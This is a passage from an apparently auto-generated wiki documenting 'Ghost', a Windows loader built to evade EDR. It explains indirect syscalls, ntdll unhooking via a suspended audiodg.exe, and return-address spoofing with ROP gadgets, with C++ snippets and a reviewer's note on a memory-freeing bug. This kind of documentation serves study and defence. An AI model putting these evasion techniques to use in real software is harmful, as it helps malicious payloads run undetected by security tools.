+<li><code>SysNtProtectVirtualMemory</code> — <code>FlushNTDLL</code> flips the local <code>.text</code> section to <code>PAGE_EXECUTE_WRITECOPY</code>, copies the clean bytes, then restores the original protection (two <code>RetSpoofCall(SysNtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, ...)</code> calls).</li>
+</ul>
+<p><strong><code>ntprocessapi.h</code></strong> builds a suspended process via <code>NtCreateUserProcess</code>: <code>NtCreateUserSuspendedProcess</code> composes an <code>UNICODE_STRING</code>, process parameters, and a <code>PS_ATTRIBUTE_LIST</code> with <code>PS_ATTRIBUTE_IMAGE_NAME</code>, then invokes <code>SysNtCreateUserProcess</code> through <code>RetSpoofCall</code> with 11 arguments (including <code>THREAD_CREATE_FLAGS_CREATE_SUSPENDED</code>) to get back a suspended process and thread handle.</p>
+<p>The caller passes argument counts to <code>RetSpoofCall</code> (5 for read/protect, 2 for terminate, 11 for create-user-process) so the variadic spoofing prologue shifts the remaining stack arguments correctly before jumping into the <code>Sys*</code> thunk.</p>
+<h2>Why this is &quot;indirect&quot; and what it defeats</h2>
+<p>A direct syscall call would place the <code>syscall</code> instruction inside the caller&#39;s own module, at the end of a custom stub. EDRs that hook ntdll scan for this pattern — a <code>syscall</code> instruction executing from an unexpected (non-ntdll) address is a strong detection signal, and EDRs also patch the first bytes of ntdll&#39;s exported stubs with a <code>jmp</code> to an instrumentation routine.</p>
+<p>The Ghost stubs are <strong>indirect</strong> because the <code>Sys*</code> thunk in the caller&#39;s module <em>never executes the <code>syscall</code> instruction</em>. Instead it loads the SSN and <code>jmp</code>s to a decoy <code>syscall</code> address that <code>GetSysCallByWalking</code> located <em>inside ntdll, in a clean (unhooked) stub</em>. The control flow is:</p>
+<!-- openwiki: mermaid parse failed and this diagram was converted to a text fence so it does not break rendering. Fix the diagram source and restore the mermaid fence. Parser error: Parse error on line 7: ...v r10, rcx ; mov eax, [dwNtX] Thunk- Expecting '()', 'SOLID_OPEN_ARROW', 'DOTTED_OPEN_ARROW', 'SOLID_ARROW', 'SOLID_ARROW_TOP', 'SOLID_ARROW_BOTTOM', 'STICK_ARROW_TOP', 'STICK_ARROW_BOTTOM', 'SOLID_ARROW_TOP_DOTTED', 'SOLID_ARROW_BOTTOM_DOTTED', 'STICK_ARROW_TOP_DOTTED', 'STICK_ARROW_BOTTOM_DOTTED', 'SOLID_ARROW_TOP_REVERSE', 'SOLID_ARROW_BOTTOM_REVERSE', 'STICK_ARROW_TOP -->
+<pre><code class="language-text">sequenceDiagram
+    participant App as Caller module
+    participant Thunk as SysNt* thunk (syscalls.asm)
+    participant Ntdll as ntdll decoy stub
+    participant Kernel as Windows kernel
+    App-&gt;&gt;Thunk: RetSpoofCall(SysNt*, nArgs, Gdgt, args)
+    Thunk-&gt;&gt;Thunk: mov r10, rcx ; mov eax, [dwNtX]
+    Thunk-&gt;&gt;Ntdll: jmp [sysCallNtX]  (decoy syscall addr)
+    Ntdll-&gt;&gt;Kernel: syscall (SSN in eax, args in r10)
+    Kernel--&gt;&gt;Ntdll: NTSTATUS return
+    Ntdll--&gt;&gt;App: ret via spoofed return address
+</code></pre>
+<p><em>Execution of the <code>syscall</code> instruction happens at the decoy address inside ntdll, not in the caller&#39;s stub, so EDR hooks that overwrite stub code are never executed.</em></p>
+<p>By jumping into a clean ntdll stub, the <code>syscall</code> instruction executes from a legitimate ntdll address (thwarting the &quot;syscall from non-ntdll&quot; heuristic), while the SSN is supplied from the loader&#39;s own <code>dwNt*</code> data — so the loader does not depend on the potentially hooked export stub, only on the clean <code>syscall</code> endpoint it found by walking. EDR hooks that overwrite the <em>leading bytes</em> of an ntdll stub (the <code>mov r10, rcx</code> / <code>mov eax, imm</code> prologue) or that patch stub code are bypassed because those bytes are in the caller&#39;s thunk, not in the executed path; and if <code>GetSysCallByWalking</code> reaches a hooked neighbor it simply walks past it to the next clean stub.</p>
+<h2>Invariants and failure semantics</h2>
+<ul>
+<li><strong>The SSN and decoy address must both be resolved before any <code>Sys*</code> call.</strong> <code>GetSysCallByWalking</code> is evaluated during static initialization of <code>functions.h</code>, so by the time <code>main()</code> runs (via <code>FlushNTDLL</code> in <code>Ghost.cpp</code>) every <code>dwNt*</code> and <code>sysCallNt*</code> global holds a valid value. The globals default to <code>0</code>, so calling a thunk before resolution would jump to address <code>0</code>; in practice they are always resolved first.</li>
+<li><strong>The decoy address points inside ntdll and lands on the <code>syscall</code> instruction (<code>+0x12</code>).</strong> <code>GetSysCallByWalking</code> computes it from a <em>clean</em> neighbor stub, so the <code>jmp</code> transfers control into an ntdll <code>syscall</code> epilogue, not into a hook trampoline. If the running build&#39;s stub layout differs (a non-0x20 stride or a different <code>syscall</code> offset), the <code>+0x12</code> constant and the <code>- track</code> SSN correction would need to change.</li>
+<li><strong>The two symbol families must match exactly across assembly and C++.</strong> The NASM <code>extern</code>s are resolved against the <code>extern &quot;C&quot;</code> <code>DWORD</code>/<code>UINT_PTR</code> definitions in <code>functions.h</code>; any rename (including the existing <code>dwNtCreateUserProccess</code> typo) must be mirrored on both sides or the link fails.</li>
+<li><strong>Assembly is NASM-only.</strong> <code>build.py</code> assembles <code>syscalls.asm</code> with NASM into <code>win64</code> object format; MASM/other assemblers cannot consume the <code>DEFAULT REL</code> / <code>[BITS 64]</code> source.</li>
+<li><strong><code>ret</code> after <code>jmp</code> is dead code.</strong> Each stub ends with <code>ret</code>, but the preceding one-way <code>jmp</code> makes it unreachable during a successful call; it exists so the function has a defined end rather than falling through.</li>
+</ul>
+</article><article class="wiki-page" id="page-9"><div class="page-label">PAGE 9 · concepts/ntdll-unhooking.md</div><hr>
+<p>type: concept
+title: NTDLL Unhooking via Suspended Process (unhook.h, ntprocessapi.h)
+description: How Ghost flushes EDR hooks from ntdll by creating a suspended audiodg.exe via an indirect syscall, reading a clean copy of ntdll from it with SysNtReadVirtualMemory, and copying the clean .text section back into the local process through NtProtectVirtualMemory.
+tags: [ntdll-unhooking, suspended-process, indirect-syscall, evasive-calling, memory-protection, ntdll]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-4e7b26c8e7c6aa4453161bae
+resource: repo://ntprocessapi.h</li>
+<li>id: openwiki-source-16495399652492148bfde7f3
+resource: repo://unhook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>NTDLL Unhooking via Suspended Process (unhook.h, ntprocessapi.h)</h1>
+<p>Ghost evicts EDR hooks planted in the local <code>ntdll.dll</code> copy by extracting a pristine ntdll image from a freshly created, suspended <code>audiodg.exe</code> process and overwriting the local <code>.text</code> section with it. The entire procedure lives in <code>unhook.h</code> (orchestration and memory rewriting) and <code>ntprocessapi.h</code> (suspended-process creation), and every sensitive native operation is executed through <strong>indirect syscalls</strong> wrapped in <code>RetSpoofCall</code> so the loader never calls hookable export stubs.</p>
+<p>This page documents the entry point <code>FlushNTDLL()</code>, the two helpers <code>GetImageSizeFromBase()</code> and <code>ReadBufferFromProcess()</code>, the <code>NtCreateUserSuspendedProcess</code> wrapper, and the important invariants that make the unhook reliable.</p>
+<h2>Entry point: FlushNTDLL()</h2>
+<p><code>FlushNTDLL()</code> in <code>unhook.h</code> is the very first statement of <code>main()</code> in <code>Ghost.cpp</code>:</p>
+<pre><code class="language-cpp">int main() {
+    FlushNTDLL();
+    PatchETW();
+    // ...
+}
+</code></pre>
+<p>It runs before anything else — before ETW patching, before resource loading and decryption, before fiber setup — so that by the time the payload executes, userland ntdll hooks hosted by an EDR are gone. Its return type is <code>VOID</code>: on failure it prints an error and returns, but does not halt the loader (experienced as a degraded, still-hooked ntdll rather than a crash). The pipeline order and the reason it is first are documented on <a href="#page-2">loader-pipeline</a>.</p>
+<h3>Unhooking steps</h3>
+<p><code>FlushNTDLL()</code> composes the following sequence:</p>
+<ol>
+<li><strong>Read the clean image</strong> — call <code>ReadBufferFromProcess(&amp;clean_buffer)</code> to obtain a heap buffer holding a pristine ntdll image read from a suspended <code>audiodg.exe</code>.</li>
+<li><strong>Resolve the local ntdll base</strong> — via <code>GetLoadedDllHandleH(776560387)</code> (PEB load-order walk, hash <code>776560387</code> is <code>C:\Windows\System32\ntdll.dll</code>; see <a href="#page-4">api-resolution-and-hashing</a>). The DOS and NT headers are validated with <code>IMAGE_DOS_SIGNATURE</code> / <code>IMAGE_NT_SIGNATURE</code>; a mismatch prints <code>IMAGE_DOS_SIGNATURE MISMATCH</code> / <code>IMAGE_NT_SIGNATURE MISMATCH</code> and aborts the function.</li>
+<li><strong>Find the <code>.text</code> section</strong> — iterate <code>pntheaders-&gt;FileHeader.NumberOfSections</code> using <code>IMAGE_FIRST_SECTION</code>, and when <code>strcmp(SECTIONS_ENTRY[i].Name, &quot;.text&quot;) == 0</code>, record:<ul>
+<li><code>LOCAL_SECTION = base + VirtualAddress</code> (the target in our process),</li>
+<li><code>REMOTE_SECTION = clean_buffer + VirtualAddress</code> (the clean source),</li>
+<li><code>SECTION_SIZE = Misc.VirtualSize</code>.</li>
+</ul>
+</li>
+<li><strong>Make local section writable</strong> — <code>SysNtProtectVirtualMemory</code> (indirect syscall through <code>RetSpoofCall</code>, 5 args, <code>SELF_HANDLE</code> = <code>(HANDLE)-1</code>) flips the local <code>.text</code> to <code>PAGE_EXECUTE_WRITECOPY</code>, saving the old protection in <code>old_protect</code>. Failure prints <code>Protection 1 Error</code> and returns.</li>
+<li><strong>Copy the clean bytes</strong> — <code>RetSpoofCall((void*)memcpy, 3, Gdgt, LOCAL_SECTION, REMOTE_SECTION, SECTION_SIZE)</code> overwrites the hooked local <code>.text</code> with the clean remote bytes.</li>
+<li><strong>Restore protection</strong> — a second <code>SysNtProtectVirtualMemory</code> restores <code>old_protect</code>, then the clean buffer is freed with <code>delete[] clean_buffer</code>.</li>
+</ol>
+<p>The two <code>NtProtectVirtualMemory</code> calls plus <code>memcpy</code> and the remote read are all ret-spoofed (the ROP gadget <code>Gdgt</code> is the shared return address), so the unhook itself does not leave a spoofable stack trace for EDR unwinding (see <a href="#page-8">indirect-syscalls</a>).</p>
+<div class="mermaid pending">sequenceDiagram
+    participant M as main() / FlushNTDLL
+    participant NP as NtCreateUserSuspendedProcess
+    participant R as SysNtReadVirtualMemory
+    participant P as NtProtectVirtualMemory
+    M-&gt;&gt;NP: create suspended audiodg.exe (SysNtCreateUserProcess)
+    NP--&gt;&gt;M: hProcess, hThread
+    M-&gt;&gt;R: remote read of clean ntdll into buffer
+    R--&gt;&gt;M: clean ntdll image buffer
+    M-&gt;&gt;M: find local .text section (base + VirtualAddress)
+    M-&gt;&gt;P: NtProtectVirtualMemory -&gt; PAGE_EXECUTE_WRITECOPY
+    P--&gt;&gt;M: old protection saved
+    M-&gt;&gt;M: memcpy clean .text over local .text
+    M-&gt;&gt;P: NtProtectVirtualMemory -&gt; restore old protection
+</div>
+<p><em>End-to-end unhook: a suspended audiodg.exe is created, its pristine ntdll is read remotely, and the local .text section is temporarily made writable, overwritten, and re-protected.</em></p>
+<h2>Helper: GetImageSizeFromBase()</h2>
+<p><code>GetImageSizeFromBase()</code> (unhook.h) resolves the module size of the loaded ntdll:</p>
+<ul>
+<li>Gets the ntdll handle via <code>GetLoadedDllHandleH(776560387)</code> and casts it to a <code>uintptr_t base</code>.</li>
+<li>Validates <code>IMAGE_DOS_SIGNATURE</code> and <code>IMAGE_NT_SIGNATURE</code> (<code>DOS MISMATCH</code> / <code>NT MISMATCH</code> on failure, returning <code>NULL</code>).</li>
+<li>Returns <code>pntheaders-&gt;OptionalHeader.SizeOfImage</code>, i.e. the full in-memory size of ntdll.</li>
+</ul>
+<p>This <code>SizeOfImage</code> is the byte count <code>ReadBufferFromProcess</code> allocates and reads from the remote process, guaranteeing the buffer is large enough to hold the entire clean ntdll image.</p>
+<h2>Helper: ReadBufferFromProcess()</h2>
+<p><code>ReadBufferFromProcess(OUT PBYTE* BUFFER)</code> (unhook.h) performs the remote acquisition:</p>
+<ol>
+<li><code>sizeofheap = GetImageSizeFromBase()</code> and <code>BASE = GetLoadedDllHandleH(776560387)</code> — the image size and the local base.</li>
+<li><code>NtCreateUserSuspendedProcess(L&quot;\\??\\C:\\Windows\\System32\\audiodg.exe&quot;, &amp;hProcess, &amp;hThread)</code> spawns a suspended process. The <code>\\??\\</code> prefix is the NT namespace path for the device-absolute <code>audiodg.exe</code>. A non-success status or a null/invalid handle prints <code>Process Creation Error</code> (but the function continues).</li>
+<li><code>bufferMemory = malloc(sizeofheap)</code>, zeroed with <code>RtlSecureZeroMemory</code>.</li>
+<li><code>status = RetSpoofCall(SysNtReadVirtualMemory, 5, Gdgt, hProcess, BASE, bufferMemory, sizeofheap, &amp;lpNumberOfBytesRead)</code> — reads <code>sizeofheap</code> bytes of ntdll from the remote suspended process&#39;s address space starting at its ntdll base. Failure prints <code>Read Error</code>.</li>
+<li><code>RetSpoofCall((void*)SysNtTerminateProcess, 2, Gdgt, hProcess, 0)</code> tears down the temporary process (terminating with exit code 0). Failure prints <code>Termination Error</code>.</li>
+<li><code>*BUFFER = bufferMemory</code> returns the allocated clean image to the caller.</li>
+</ol>
+<p>Because <code>audiodg.exe</code> is spawned <strong>suspended</strong>, its ntdll is mapped but its loader and any EDR userland instrumentation that would run at process start have not initialized — so its ntdll <code>.text</code> is the pristine on-disk bytes, free of hooks.</p>
+<h2>NtCreateUserSuspendedProcess (ntprocessapi.h)</h2>
+<p><code>NtCreateUserSuspendedProcess(const wchar_t* szProcessName, PHANDLE hCreatedProcess, PHANDLE hCreatedThread)</code> (ntprocessapi.h) wraps <code>NtCreateUserProcess</code> through the <code>SysNtCreateUserProcess</code> indirect syscall. Its job is to build the argument block the kernel requires, then request a suspended process and thread.</p>
+<h3>Building the parameters</h3>
+<ol>
+<li><strong>Image path</strong> — <code>RtlInitUnicodeString(&amp;NtImagePath, szProcessName)</code> forms the <code>UNICODE_STRING</code> for <code>\??\C:\Windows\System32\audiodg.exe</code>.</li>
+<li><strong>Process parameters</strong> — <code>RetSpoofCall((void*)RtlCreateProcessParametersEx, 11, Gdgt, &amp;ProcessParameters, &amp;NtImagePath, NULL, NULL, &amp;NtImagePath, ...)</code> allocates an <code>RTL_USER_PROCESS_PARAMETERS</code> (declared in <code>structs.h</code>), using <code>NtImagePath</code> for the image path and command line and <code>RTL_USER_PROCESS_PARAMETERS_NORMALIZED</code>.</li>
+<li><strong>PS_CREATE_INFO</strong> — a <code>PS_CREATE_INFO</code> initialized with <code>Size</code> and <code>State = PsCreateInitialState</code> (see the <code>PS_CREATE_STATE</code> enum in <code>structs.h</code>).</li>
+<li><strong>PS_ATTRIBUTE_LIST</strong> — a <code>PS_ATTRIBUTE_LIST</code> (size of one <code>PS_ATTRIBUTE</code>, <code>TotalLength</code> accounting for the trailing attribute) whose <code>Attributes[0]</code> carries the image name:<ul>
+<li><code>Attribute = PS_ATTRIBUTE_IMAGE_NAME</code> (the macro expands through <code>PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE)</code> — an <em>input</em> attribute, number <code>PsAttributeImageName</code>),</li>
+<li><code>Size = NtImagePath.Length</code>,</li>
+<li><code>Value = (ULONG_PTR)NtImagePath.Buffer</code>.</li>
+</ul>
+</li>
+</ol>
+<h3>The suspended creation call</h3>
+<p>The wrapper then invokes the indirect syscall with 11 arguments:</p>
+<pre><code class="language-cpp">status = (NTSTATUS)RetSpoofCall((void*)SysNtCreateUserProcess, 11, Gdgt,
+    &amp;hProcess, &amp;hThread,
+    PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE |
+        PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_TERMINATE,
+    THREAD_SUSPEND_RESUME,
+    NULL, NULL,
+    0,                              // ProcessFlags
+    THREAD_CREATE_FLAGS_CREATE_SUSPENDED,  // ThreadFlags
+    ProcessParameters,
+    &amp;CreateInfo,
+    &amp;AttributeList);
+</code></pre>
+<p>The process access mask (<code>PROCESS_VM_*</code>, <code>PROCESS_QUERY_LIMITED_INFORMATION</code>, <code>PROCESS_TERMINATE</code>) is chosen to permit the subsequent remote read and termination while granting no more than needed. <code>THREAD_CREATE_FLAGS_CREATE_SUSPENDED</code> is what leaves the primary thread suspended — the entire point of this stage. On success the handles are written to <code>*hCreatedProcess</code> / <code>*hCreatedThread</code> and the <code>NTSTATUS</code> returned.</p>
+<p>The <code>SysNtCreateUserProcess</code> thunk (in <code>syscalls.asm</code>) loads the SSN from <code>dwNtCreateUserProccess</code> and jumps to the decoy <code>syscall</code> address <code>sysCallNtCreateProcess</code> resolved by <code>GetSysCallByWalking</code>, so the <code>syscall</code> instruction executes inside clean ntdll rather than in the caller&#39;s stub (see <a href="#page-8">indirect-syscalls</a>).</p>
+<h2>Hardcoded target and why audiodg.exe</h2>
+<p><code>unhook.h</code> and <code>ntprocessapi.h</code> hardcode the single target image <code>\??\C:\Windows\System32\audiodg.exe</code> (Windows Audio Device Graph Isolation). <code>audiodg.exe</code> is a signed system binary that ships with Windows, executes from a trusted path, and by default has ntdll mapped without early userland hook instrumentation active in a <em>suspended</em> process. Using a suspended process sidesteps the need to read ntdll from disk (which can itself be tampered or re-parsed on disk) and avoids resolving a clean module handle inside the already-hooked local process.</p>
+<h2>Invariants and failure semantics</h2>
+<ul>
+<li><strong><code>FlushNTDLL()</code> must run before any hooked API is relied upon.</strong> It is the first statement of <code>main()</code>. Until it completes, direct calls to functions like <code>GetProcAddress</code>-style resolvers are fine (they walk the PEB / parse exports), but any EDR-hooked syscall export would redirect to the hook.</li>
+<li><strong>The local and remote images are assumed to be the same build.</strong> The remote buffer is read at the local base and the same section RVAs are used for both; if the OS provides a patched/updated ntdll to the new process that differs from the loaded one, the overwrite could introduce a version-skew into the local .text. The code makes no version check.</li>
+<li><strong>Signature validation gates the whole flow.</strong> Both <code>GetImageSizeFromBase()</code> and <code>FlushNTDLL()</code> check <code>IMAGE_DOS_SIGNATURE</code> / <code>IMAGE_NT_SIGNATURE</code> and print a mismatch rather than dereferencing an invalid header. <code>FlushNTDLL()</code> returns (VOID) on mismatch, leaving ntdll hooked.</li>
+<li><strong>Errors are non-fatal by design.</strong> <code>VOID</code> returns and <code>std::cout</code> diagnostics mean each step reports and continues rather than aborting the process. This is consistent with <code>_DEBUG_PRINT</code>-gated logging in the loader.</li>
+<li><strong>Protection must be restored even on the copy path.</strong> If the first <code>NtProtectVirtualMemory</code> fails, <code>FlushNTDLL()</code> returns before modifying any bytes, so <code>.text</code> is never left writable-execute non-copied. The second protect restores <code>old_protect</code> (the exact prior protection, not a hardcoded constant).</li>
+<li class="flagged-warning"><strong>Memory management:</strong> <code>ReadBufferFromProcess</code> hands ownership of the <code>malloc</code>&#39;d buffer to the caller; <code>FlushNTDLL</code> frees it with <code>delete[] clean_buffer</code> after the copy.</li>
+<li><strong>Temporary process lifecycle:</strong> <code>ReadBufferFromProcess</code> terminates the spawned <code>audiodg.exe</code> immediately after the read, so no orphan window is left running.</li>
+</ul><aside class="inline-issue issue-orange" id="ghost-openwiki-free" data-issue>
+      <div class="issue-label">关键风险遗漏 · P1</div><h3>写出了 malloc 和 delete[]，却没有说明两者不能配对</h3>
+      <div class="issue-five">
+        <div><b>原 Wiki 怎么说</b><p>Wiki 说缓冲区由 malloc 申请，随后由 delete[] 释放，语气像正常的所有权交接。</p></div>
+        <div><b>源码实际是什么</b><p>C/C++ 中 malloc 应与 free 配对；用 delete[] 释放属于未定义行为。</p></div>
+        <div><b>普通人怎么理解</b><p>从 A 柜台借出的东西交给 B 柜台归还，程序可能崩溃或破坏内存。</p></div>
+        <div><b>为什么影响判断</b><p>工程师可能照抄错误的资源释放方式。</p></div>
+        <div><b>建议怎么改</b><p>明确标成缺陷，并把两处 delete[] 改为与 malloc 匹配的 free。</p></div>
+      </div>
+      <details><summary>查看该仓库快照中的源码证据</summary><p><a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/Ghost.cpp#L88-L94">Ghost.cpp：解密缓冲区释放 ↗</a>　<a href="https://github.com/cpu0x00/Ghost/blob/bf67313c72d1df48117daf4aeca604e83a570280/unhook.h#L52-L137">unhook.h：临时缓冲区释放 ↗</a></p></details>
+    </aside>
+<h2>Relationship to other pages</h2>
+<ul>
+<li><a href="#page-8">indirect-syscalls</a> — the <code>SysNtReadVirtualMemory</code>, <code>SysNtProtectVirtualMemory</code>, <code>SysNtTerminateProcess</code>, and <code>SysNtCreateUserProcess</code> thunks and SSN resolution this page depends on.</li>
+<li><a href="#page-4">api-resolution-and-hashing</a> — <code>GetLoadedDllHandleH(776560387)</code> and the PEB/export walking used to locate ntdll without <code>GetModuleHandle</code>.</li>
+<li><a href="#page-2">loader-pipeline</a> — where <code>FlushNTDLL()</code> sits as the first phase of <code>main()</code>.</li>
+</ul>
+</article><article class="wiki-page" id="page-10"><div class="page-label">PAGE 10 · concepts/return-address-spoofing.md</div><hr>
+<p>type: concept
+title: Return Address Spoofing (RetSpoofCall)
+description: How Ghost&#39;s RetSpoofCall variadic assembly wrapper in retaddrspoof.asm places a random &#39;call r12&#39; ROP gadget as the return address of every sensitive call, so EDR stack unwinding never attributes the call back to the loader&#39;s frames.
+tags: [return-address-spoofing, rop-gadget, call-r12, ntdll, evasive-calling, variadic-call, stack-unwinding, nasm]
+verified:</p>
+<ul>
+<li>by: openwiki/0.5.0
+at: 2026-09-03T03:10:44.817Z
+sources:</li>
+<li>id: openwiki-source-1d03e6e9af2ba4a79ba97ceb
+resource: repo://AES.h</li>
+<li>id: openwiki-source-7923dc349e377706a428462b
+resource: repo://allocator.h</li>
+<li>id: openwiki-source-e0fa2003814e1fa147c561c8
+resource: repo://build.py</li>
+<li>id: openwiki-source-6d868c08609ee9adc8759685
+resource: repo://etw.h</li>
+<li>id: openwiki-source-fa04fdb0e1e359bf40e1bf73
+resource: repo://Ghost.cpp</li>
+<li>id: openwiki-source-c959c853f7e9085f6114cb2f
+resource: repo://hook.h</li>
+<li>id: openwiki-source-4e7b26c8e7c6aa4453161bae
+resource: repo://ntprocessapi.h</li>
+<li>id: openwiki-source-554731dccd1cc779d1043b8d
+resource: repo://retaddrspoof.asm</li>
+<li>id: openwiki-source-e982a2c1bff6b6cb1af1f6e3
+resource: repo://retaddrspoof.h</li>
+<li>id: openwiki-source-5cb3011b8d6f9c28cfbb8ee6
+resource: repo://rsrc.h</li>
+<li>id: openwiki-source-16495399652492148bfde7f3
+resource: repo://unhook.h
+generated: { by: &quot;openwiki/0.5.0&quot;, at: &quot;2026-09-03T03:10:44.817Z&quot; }</li>
+</ul>
+<hr>
+<h1>Return Address Spoofing (RetSpoofCall)</h1>
+<p>Ghost routes nearly every sensitive call through a single variadic assembly wrapper, <code>RetSpoofCall</code> in <code>retaddrspoof.asm</code>, whose purpose is to hide the loader&#39;s own call stack from EDR stack unwinding. Instead of returning into a frame in the loader&#39;s module, the wrapped function returns through a randomly chosen <strong>ROP gadget</strong> — a <code>call r12</code> instruction (<code>41 FF D4</code>) located inside ntdll — so an unwinder walking the stack sees the caller as a legitimate ntdll gadget rather than a loader frame. This is the per-call stack-hiding technique that every other module composes with (see <a href="#page-2">loader-pipeline</a>, <a href="#page-5">etw-patching</a>, <a href="#page-9">ntdll-unhooking</a>, and <a href="#page-8">indirect-syscalls</a>).</p>
+<p>The primitive has two cooperating halves:</p>
+<ul>
+<li><strong><code>retaddrspoof.h</code></strong> — declares <code>RetSpoofCall</code> as an <code>extern &quot;C&quot;</code> variadic function and implements <code>FindROPGadget</code>, which locates the <code>call r12</code> gadget inside ntdll&#39;s executable sections.</li>
+<li><strong><code>retaddrspoof.asm</code></strong> — the NASM implementation of <code>RetSpoofCall</code> that marshals the target function&#39;s variadic arguments, plants the gadget as the return address, jumps into the target, and later fixes up the frame.</li>
+</ul>
+<h2>The calling-convention shift</h2>
+<p><code>RetSpoofCall</code> changes the normal Win64 convention by consuming the first three register arguments itself and passing the rest through to the real target:</p>
+<pre><code class="language-c">extern &quot;C&quot; void* RetSpoofCall(void* Function, unsigned long long nArgs, void* r12_gadget, void* argN, ...);
+</code></pre>
+<ul>
+<li><strong><code>rcx</code> — <code>Function</code></strong> — the address of the function to invoke (an API, an NT function, or a <code>SysNt*</code> indirect-syscall thunk).</li>
+<li><strong><code>rdx</code> — <code>nArgs</code></strong> — the number of <em>real</em> arguments to pass to <code>Function</code> (excluding the three wrapper arguments).</li>
+<li><strong><code>r8</code> — <code>r12_gadget</code></strong> — the ROP gadget (the <code>call r12</code> address from <code>Gdgt</code>) that becomes the target&#39;s return address.</li>
+<li><strong><code>r9</code> onward / stack — <code>argN...</code></strong> — the target function&#39;s actual arguments, shifted down three slots.</li>
+</ul>
+<p>Because the prologue shifts everything down by three, the same variadic wrapper works for any target arity. The header documents the return value as <code>void*</code> so a result (an <code>NTSTATUS</code>, a handle, a pointer) can be cast to whatever the caller expects.</p>
+<p>Typical call sites pass the resolved function pointer first and the global gadget third, e.g. from <code>Ghost.cpp</code>:</p>
+<pre><code class="language-c">status = reinterpret_cast&lt;NTSTATUS&gt;(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &amp;pLPI-&gt;lpPage, &amp;pLPI-&gt;uSize, PAGE_EXECUTE_READ, &amp;OldAccessProtection));
+</code></pre>
+<h2>Finding the gadget: FindROPGadget</h2>
+<p><code>FindROPGadget</code> in <code>retaddrspoof.h</code> locates a valid <code>call r12</code> gadget inside ntdll to use as the planted return address:</p>
+<ol>
+<li>It reads the ntdll base from the <code>hNT</code> global (the hash-resolved <code>HMODULE</code> in <code>functions.h</code>) and validates the DOS signature (<code>e_magic == IMAGE_DOS_SIGNATURE</code>) and NT signature (<code>Signature == IMAGE_NT_SIGNATURE</code>).</li>
+<li>It walks every section header and keeps only sections with both <code>IMAGE_SCN_CNT_CODE</code> and <code>IMAGE_SCN_MEM_EXECUTE</code> (i.e. executable code sections, so the returned address is executable).</li>
+<li>Within each such section it scans every byte for the 3-byte pattern <code>41 FF D4</code>, checked by <code>IsValidGadgetx64</code> (<code>*pbAddress == 0x41 &amp;&amp; *(pbAddress+1) == 0xFF &amp;&amp; *(pbAddress+2) == 0xD4</code>), which is the <code>call r12</code> instruction.</li>
+<li>Valid matches are collected into a local <code>lpGadgets[MAX_GADGETS]</code> array (zeroed with <code>RtlSecureZeroMemory</code>), capped at <code>MAX_GADGETS</code> (30); the scan stops early once 30 are found.</li>
+<li>It returns <code>(PBYTE)lpGadgets[GEN_RAND(0, dwGadgetCount)]</code>, i.e. one randomly chosen instance, so the spoofing return address differs run to run. <code>GEN_RAND(min, max)</code> is <code>rand() % (max + 1 - min) + min</code>.</li>
+</ol>
+<p>The gadget must be a <code>call r12</code> (not just any <code>call</code>) because the assembly prologue loads the real return handler into <code>r12</code> — the gadget&#39;s <code>call r12</code> jumps to <code>Fixup</code>, which restores the loader&#39;s stack frame before control returns to the original caller.</p>
+<h2>The global Gdgt</h2>
+<p>The randomly chosen gadget is stored once in the global <code>PVOID Gdgt</code>:</p>
+<pre><code class="language-c">PVOID Gdgt = FindROPGadget(); // used all across the project for ret address spoofing
+</code></pre>
+<p>This is defined in <code>Ghost.cpp</code> at static-initialization time (before <code>main()</code> runs) and <code>extern</code>&#39;d across the modules that spoof their calls — <code>allocator.h</code>, <code>unhook.h</code>, <code>etw.h</code>, <code>AES.h</code>, <code>hook.h</code>, <code>rsrc.h</code>, and <code>ntprocessapi.h</code> all declare <code>extern PVOID Gdgt;</code> and pass it as the third argument to <code>RetSpoofCall</code>. Because it is resolved once up front, every module reuses the same gadget for the lifetime of the process. This is why the gadget is also available at exactly the point where the wrapper&#39;s <code>lea r12, Fixup</code> and the gadget&#39;s <code>call r12</code> agree on what <code>r12</code> means.</p>
+<h2>How RetSpoofCall works (assembly)</h2>
+<p><code>retaddrspoof.asm</code> is <strong>NASM-only</strong> — its header states <code>NOT MASM</code>, it uses <code>[BITS 64]</code> and <code>DEFAULT REL</code>, and <code>build.py</code> assembles it with <code>/usr/bin/nasm</code> (alongside <code>syscalls.asm</code>). Its name follows the same <code>extern &quot;C&quot;</code> convention, so the C++ declaration in <code>retaddrspoof.h</code> links to the assembly <code>global RetSpoofCall</code> symbol.</p>
+<p>The procedure is a two-stage trampoline:</p>
+<ul>
+<li><strong>Prologue / marshalling.</strong> It reserves <code>0x100</code> bytes of scratch (<code>sub rsp, 0x100</code>), saves the non-volatile registers (<code>rsi</code>, <code>rdi</code>, <code>r12</code>) into that scratch, and saves the target in <code>r10</code> (<code>mov r10, rcx</code>) while loading <code>r12</code> with the address of <code>Fixup</code> (<code>lea r12, Fixup</code>). After <code>sub rsp, 0x200</code> for working space, it writes the gadget into the slot that will serve as the return address (<code>mov [rsp], r8</code>).</li>
+<li><strong>Argument shifting.</strong> If <code>nArgs</code> is <code>0</code>, it jumps straight to the call. Otherwise it shifts every argument down by three: for up to four real arguments it moves <code>r9</code> into <code>rcx</code> and pulls the stack arguments from <code>[rsp+0x300+0x28]</code>, <code>[rsp+0x300+0x30]</code>, and <code>[rsp+0x300+0x38]</code> into <code>rdx</code>/<code>r8</code>/<code>r9</code> (the <code>0x300</code> accounts for the two <code>sub rsp</code> frames plus the caller&#39;s original spill). It moves <em>all</em> of them unconditionally because setting a register that a target does not use is harmless. For more than four arguments it uses <code>rep movsq</code> to copy the stack arguments down four slots (<code>rsi</code>/<code>rdi</code> pair with <code>rcx = nArgs - 4</code>), using an extra <code>0x18</code> offset because the fourth real argument was sitting in the seventh stack slot. The original <code>rcx</code> is restored afterward so the target still sees the 